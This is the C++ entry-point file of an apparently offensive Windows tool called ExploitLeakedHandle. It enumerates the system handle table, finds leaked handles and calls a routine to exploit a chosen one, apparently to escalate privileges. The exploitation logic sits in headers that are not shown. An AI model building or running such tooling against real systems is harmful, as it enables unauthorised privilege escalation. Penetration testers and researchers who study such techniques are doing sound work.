#include "ElhInit.h"
#include "ElhExploit.h"

int wmain(int argc, wchar_t** argv) {
    // Display ExploitLeakedHandle banner
    ElhInit::printBanner();

    // Retrieve system handle table
    PSYSTEM_HANDLE_INFORMATION pSystemHandleInfo = ElhInit::getSystemHandleInformation();
    if (pSystemHandleInfo == nullptr) {
        printf("[*] Failed to get system handle table.\n");
        return 1;
    }

    // Initialize vector for storing "interesting" handle objects
    std::vector<ElhInit::HANDLE_OBJ> interestingHandles;

    // Search & add leaked handles to the interestingHandles vector
    ElhInit::findLeakedHandles(pSystemHandleInfo, interestingHandles);
    if (interestingHandles.size() == 0) {
        printf("[!] No interesting handles found.\n");
        return 0;
    }

    // Initialize new ElhExploit object with the interesting handles
    ElhExploit* elh = new ElhExploit(interestingHandles);
    if (!elh->selectionValid()) {
        printf("[!] Invalid selection.\n");
        return 1;
    }

    // Attempt to exploit a handle, and print the result
    if (elh->exploitHandle()) {
        printf("\n[+] Success!\n");
    } else {
        printf("\n[!] Failed to exploit handle.\n");
    }

    // Clean up & exit
    delete elh;

    return 0;
}